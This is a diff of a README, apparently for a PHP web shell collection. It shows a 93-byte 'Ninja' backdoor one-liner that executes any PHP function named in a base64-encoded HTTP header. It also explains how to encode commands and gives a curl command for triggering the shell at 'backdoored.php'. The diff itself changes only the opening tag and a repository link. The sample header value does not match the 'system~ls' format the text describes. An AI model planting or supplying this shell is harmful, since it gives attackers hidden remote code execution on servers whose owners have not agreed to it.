@@ -24,7 +24,7 @@ For example, the code below will execute the `ls` command:
 
 ### Ninja
 ```php
-<?$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
+<?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
 ```
 #### Features
 - 93 bytes in size
@@ -36,7 +36,7 @@ Lets say you want to run `system(ls)` so write it as `system~ls` and then base64
 Now add any **1** character at the start of it. Let say 'x' so it will be `xc3lzdGVtKGxzKQ==`\
 Now open your terminal and type the following command\
 `curl -H 'x: xc3lzdGVtKGxzKQ==' http://example.com/backdoored.php`\
-Too much work? You can use the [handler](https://github.com/UltimateHackers/nano/blob/master/handler.py) instead.
+Too much work? You can use the [handler](https://github.com/s0md3v/nano/blob/master/handler.py) instead.
 
 ![handler](https://i.imgur.com/hkAHGwH.png)
 
